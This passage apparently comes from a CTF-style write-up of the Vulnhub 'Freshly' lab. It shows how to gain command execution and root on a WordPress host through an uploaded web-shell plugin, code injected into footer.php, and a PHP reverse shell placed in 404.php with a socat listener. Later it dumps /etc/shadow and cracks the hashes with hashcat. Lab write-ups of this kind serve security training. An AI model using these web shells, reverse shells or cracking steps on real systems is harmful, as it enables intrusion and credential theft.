+  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+  libuuid:x:100:101::/var/lib/libuuid:
+  syslog:x:101:104::/home/syslog:/bin/false
+  messagebus:x:102:105::/var/run/dbus:/bin/false
+  user:x:1000:1000:user,,,:/home/user:/bin/bash
+  mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
+  candycane:x:1001:1001::/home/candycane:
+  # YOU STOLE MY SECRET FILE!
+  # SECRET = “NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!”
+
+
+Create your own WordPress plugin
+--------------------------------
+
+An alternative approach is to follow `Vulnhub – (TopHatSec) Freshly Writeup <http://dook.biz/2015/04/vulnhub-tophatsec-freshly-writeup/>`_ and create your own WordPress plugin. This has the advantage of password-less access to a page allowing execution of arbitrary shell commands. This author personally likes this one the best.
+
+.. code-block:: bash
+
+  cd $JOB/exploit
+  cat > exploit-plugin.php <<EOF
+  <?php
+   /*
+   Plugin Name: Execute arbitrary command line program
+   Plugin URI: www.example.com
+   Description: Makes your WordPress site vulnerable.
+   Author: pentest-meetup
+   Version: 1.0
+   Author URI: www.example.com
+   */
+   passthru(\$_GET["cmd"]);
+  ?>
+  zip -r exploit-plugin exploit-plugin.php
+  EOF
+
+Add & activate the plugin via the http://$T:8080/wordpress/wp-admin/ :menuselection:`Plugins --> Add new --> Upload Plugin --> Browse --> Install now --> Activate Plugin` menu item. To execute arbitrary commands:
+
+.. code-block:: bash
+
+  curl --silent http://$T:8080/wordpress/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd=cat%20/etc/passwd
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1,26-27
+
+  hacker@kali:~/local/pentest/phouse/freshly/exploit$ curl --silent http://$T:8080/wordpress/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd=cat%20/etc/passwd
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+  bin:x:2:2:bin:/bin:/usr/sbin/nologin
+  sys:x:3:3:sys:/dev:/usr/sbin/nologin
+  sync:x:4:65534:sync:/bin:/bin/sync
+  games:x:5:60:games:/usr/games:/usr/sbin/nologin
+  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+  libuuid:x:100:101::/var/lib/libuuid:
+  syslog:x:101:104::/home/syslog:/bin/false
+  messagebus:x:102:105::/var/run/dbus:/bin/false
+  user:x:1000:1000:user,,,:/home/user:/bin/bash
+  mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
+  candycane:x:1001:1001::/home/candycane:
+  # YOU STOLE MY SECRET FILE!
+  # SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
+
+Put php in footer.php
+---------------------
+
+An alternative approach is to follow `Vulnhub - Freshly <http://matthieukeller.com/2015/04/vulnhub-freshly.html>`_ and add exploit php code to the footer.php file (making the modifications very obvious to all WordPress users). On the http://$T:8080/wordpress/wp-admin/ admin page select :menuselection:`Appearance --> Editor --> Footer (footer.php)`, add the following php code to :file:`footer.php` just prior to the "</body>" tag, then select :menuselection:`Update File`:
+
+.. code-block:: php
+
+  <?php passthru('cat /etc/passwd'); ?>
+
+To perform the exploit:
+
+.. code-block:: bash
+
+  curl --silent http://$T:8080/wordpress/ | \
+      sed -n '/^root/,$p'
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1,26-27
+
+  hacker@kali:~/local/pentest/phouse/freshly/exploit$ curl --silent http://$T:8080/wordpress/ | sed -n '/^root/,$p'
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+  bin:x:2:2:bin:/bin:/usr/sbin/nologin
+  sys:x:3:3:sys:/dev:/usr/sbin/nologin
+  sync:x:4:65534:sync:/bin:/bin/sync
+  games:x:5:60:games:/usr/games:/usr/sbin/nologin
+  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+  libuuid:x:100:101::/var/lib/libuuid:
+  syslog:x:101:104::/home/syslog:/bin/false
+  messagebus:x:102:105::/var/run/dbus:/bin/false
+  user:x:1000:1000:user,,,:/home/user:/bin/bash
+  mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
+  candycane:x:1001:1001::/home/candycane:
+  # YOU STOLE MY SECRET FILE!
+  # SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
+  </body>
+  </html>
+
+Getting a reverse shell and root
+--------------------------------
+
+This one will be better for 2 reasons. First, a reverse shell is opened leading to getting root. Second, it updates :file:`404.php` which is less obvious than changing the often-used :file:`footer.php`. This is a combination of various reverse shell writeups on the web: `TopHatSec: Freshly <http://rastamouse.me/blog/2015/tophatsec-freshly/>`_ and `A freshly squeezed cup of pwnage <http://www.mogozobo.com/?p=2468>`_.
+
+`pentestmonkey php-reverse-shell <http://pentestmonkey.net/tools/web-shells/php-reverse-shell>`_ is already available on Kali:
+
+.. code-block:: bash
+
+  cd $JOB/exploit
+  locate php | grep reverse
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1,4
+
+  hacker@kali:~/local/pentest/phouse/freshly/exploit$ locate php | grep reverse
+  /usr/share/beef-xss/modules/exploits/m0n0wall/php-reverse-shell.php
+  /usr/share/laudanum/php/php-reverse-shell.php
+  /usr/share/webshells/php/php-reverse-shell.php
+
+Kali's :file:`/usr/share/webshells/php/php-reverse-shell.php` is the pentestmonkey :file:`php-reverse-shell.php`.
+
+On the http://$T:8080/wordpress/wp-admin/ admin page select :menuselection:`Appearance --> Editor --> 404 Template (404.php)`, replace the contents with :file:`/usr/share/webshells/php/php-reverse-shell.php` php code. Edit the following 2 lines to reflect your attack machine's ip & port used:
+
+.. code-block:: perl
+
+  $ip = '127.0.0.1';  // CHANGE THIS
+  $port = 1234;       // CHANGE THIS
+
+At this point save your edits via :menuselection:`Update File`.
+
+On your attack machine fire up a listener:
+
+.. code-block:: bash
+
+  # fire up a listener
+  socat - TCP-LISTEN:1234
+  
+Then in a separate window kick off the shell:
+
+.. code-block:: bash
+
+  cd $JOB/exploit
+  curl --silent http://$T:8080/wordpress/404.php
+
+Now you'll get a tty-less shell back on your :program:`socat` terminal. Following `Post-Exploitation Without A TTY <http://pentestmonkey.net/blog/post-exploitation-without-a-tty>`_ you'll run the following in your reverse shell to correct the problem of being tty-less:
+
+.. code-block:: bash
+
+  python -c 'import pty; pty.spawn("/bin/bash")'
+
+Here goes our exploit console. Notice that :file:`/etc/shadow` has improper permissions and we could use that for a brute force password cracking. But it turns out that root uses the admin password of "SuperSecretPassword":
+
+.. code-block:: console
+  :emphasize-lines: 1,5-17
+
+  hacker@kali:~/local/pentest/phouse/freshly/exploit$ socat - TCP-LISTEN:1234
+  Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 athlon i686 GNU/Linux
+   14:38:12 up  2:39,  0 users,  load average: 0.00, 0.01, 0.05
+  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+  uid=1(daemon) gid=1(daemon) groups=1(daemon)
+  /bin/sh: 0: can't access tty; job control turned off
+  $ # no tty so we cannot su to root, so get a tty via python
+  $ python -c 'import pty; pty.spawn("/bin/bash")'
+  daemon@Freshly:/$ # try a password for root that we already know
+  daemon@Freshly:/$ su - root
+  su - root
+  Password: SuperSecretPassword
+
+  root@Freshly:~# # it worked - root
+  root@Freshly:~# id
+  id
+  uid=0(root) gid=0(root) groups=0(root)
+
+We're root and so done. But what if that didn't work? Let's back out of root and do some recon to see if we can get at :file:`/etc/shadow` and crack the passwords.
+
+.. code-block:: console
+  :emphasize-lines: 1-7,28,30
+
+  root@Freshly:~# exit
+  daemon@Freshly:/$ ls -l /etc/shadow
+  ls -l /etc/shadow
+  -rwxr-xr-x 1 root shadow 1030 Feb 17 01:56 /etc/shadow
+  daemon@Freshly:/$ cat /etc/shadow
+  cat /etc/shadow
+  root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
+  daemon:*:16483:0:99999:7:::
+  bin:*:16483:0:99999:7:::
+  sys:*:16483:0:99999:7:::
+  sync:*:16483:0:99999:7:::
+  games:*:16483:0:99999:7:::
+  man:*:16483:0:99999:7:::
+  lp:*:16483:0:99999:7:::
+  mail:*:16483:0:99999:7:::
+  news:*:16483:0:99999:7:::
+  uucp:*:16483:0:99999:7:::
+  proxy:*:16483:0:99999:7:::
+  www-data:*:16483:0:99999:7:::
+  backup:*:16483:0:99999:7:::
+  list:*:16483:0:99999:7:::
+  irc:*:16483:0:99999:7:::
+  gnats:*:16483:0:99999:7:::
+  nobody:*:16483:0:99999:7:::
+  libuuid:!:16483:0:99999:7:::
+  syslog:*:16483:0:99999:7:::
+  messagebus:*:16483:0:99999:7:::
+  user:$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
+  mysql:!:16483:0:99999:7:::
+  candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
+  # YOU STOLE MY PASSWORD FILE!
+  # SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
+
+Let's try and crack the hashes on our Kali Linux box using :program:`hashcat`. Cut and paste :file:`/etc/shadow` into :file:`$JOB/hashcat/shadow.txt` on Kali; once that's done run the following to convert that to :program:`hashcat` format and crack the password:
+
+.. code-block:: bash
+  :emphasize-lines: 2-4,7,10-11,13-14
+
+  cd $JOB/hashcat
+  # cut and paste /etc/shadow into shadow.txt
+  # get rid of everything except for the actual hash
+  cut -d: -f2 shadow.txt | grep '^$6\$' > hashes.txt
+  # boo - running hashid defaults to python3 which fails on Kali
+  #   so force python2
+  python2 $(which hashid) -m hashes.txt
+  # hashcat mode 1800 it is ...
+  # add our known possible password to the rockyou list
+  echo "SuperSecretPassword" > wordlist.txt
+  zcat /usr/share/wordlists/rockyou* >> wordlist.txt
+  # run hashcat
+  hashcat --hash-type=1800 --potfile-disable hashes.txt wordlist.txt | \
+      tee cracked.txt
+
+Running this gives us our password:
+
+.. code-block:: console
+  :emphasize-lines: 4,7,10,18-19,21-22,29
+
+  hacker@kali:~/local/pentest/phouse/freshly/exploit$ # cd $JOB/hashcat
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ # cut and paste /etc/shadow into shadow.txt
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ # get rid of everything except for the actual hash
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ cut -d: -f2 shadow.txt | grep '^$6\$' > hashes.txt
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ # boo - running hashid defaults to python3 which fails on Kali
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ #   so force python2
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ python2 $(which hashid) -m hashes.txt
+  --File 'hashes.txt'--
+  Analyzing '$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/'
+  [+] SHA-512 Crypt [Hashcat Mode: 1800]
+  Analyzing '$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31'
+  [+] SHA-512 Crypt [Hashcat Mode: 1800]
+  Analyzing '$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/'
+  [+] SHA-512 Crypt [Hashcat Mode: 1800]
+  --End of file 'hashes.txt'--
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ # hashcat mode 1800 it is ...
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ # add our known possible password to the rockyou list
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ echo "SuperSecretPassword" > wordlist.txt
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ zcat /usr/share/wordlists/rockyou* >> wordlist.txt
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ # run hashcat
+  hacker@kali:~/local/pentest/phouse/freshly/hashcat$ hashcat --hash-type=1800 --potfile-disable hashes.txt wordlist.txt | \
+  >     tee cracked.txt
+  Initializing hashcat v0.49 with 1 threads and 32mb segment-size...
+
+  Added hashes from file hashes.txt: 3 (3 salts)
+
+  NOTE: press enter for status-screen
+
+  $6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:SuperSecretPassword
+  $6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:SuperSecretPassword
+  $6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:password
+
+  All hashes have been recovered
+
+  Input.Mode: Dict (wordlist.txt)
+  Index.....: 1/5 (segment), 3627172 (words), 33550348 (bytes)
+  Recovered.: 3/3 hashes, 3/3 salts
+  Speed/sec.: - plains, - words
+  Progress..: 8/3627172 (0.00%)
+  Running...: --:--:--:--
+  Estimated.: --:--:--:--
+
+  Started: Tue May 26 23:12:37 2015
+  Stopped: Tue May 26 23:12:38 2015
+
+With the cracked password we can get root as before on Freshly:
+
+.. code-block:: console
+  :emphasize-lines: 1-7
+
+  daemon@Freshly:/$ su - root
+  su - root
+  Password: SuperSecretPassword
+
+  root@Freshly:~# id
+  id
+  uid=0(root) gid=0(root) groups=0(root)
+
+We're root and so done.
+
